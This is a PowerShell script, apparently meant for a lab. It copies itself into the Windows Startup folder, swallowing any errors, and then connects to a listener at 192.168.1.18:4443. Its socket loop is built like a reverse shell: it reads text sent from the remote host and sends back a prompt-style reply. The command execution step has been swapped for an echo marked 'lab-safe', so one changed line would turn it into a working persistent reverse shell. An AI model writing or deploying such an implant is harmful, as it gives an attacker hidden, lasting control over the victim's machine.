# Persist to Startup
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\code1.ps1"

try {
    if (-not (Test-Path $startupPath)) {
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $startupPath -Force
    }
} catch {
    # silently ignore errors
}

# TCP Connection (lab-safe)
$serverIP = '192.168.1.18'  # Lab listener IP
$serverPort = 4443           # Lab listener port

try {
    $c = New-Object Net.Sockets.TCPClient($serverIP, $serverPort)
    $s = $c.GetStream()
    [byte[]]$b = 0..65535 | % {0}

    while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
        $d = ([Text.Encoding]::ASCII).GetString($b, 0, $i)
        # Safe echo, no execution
        $r2 = "Executed safely in lab: $d PS " + (pwd).Path + "> "
        $s.Write(([Text.Encoding]::ASCII).GetBytes($r2), 0, $r2.Length)
        $s.Flush()
    }

    $c.Close()
} catch {
    # silently ignore connection errors
}
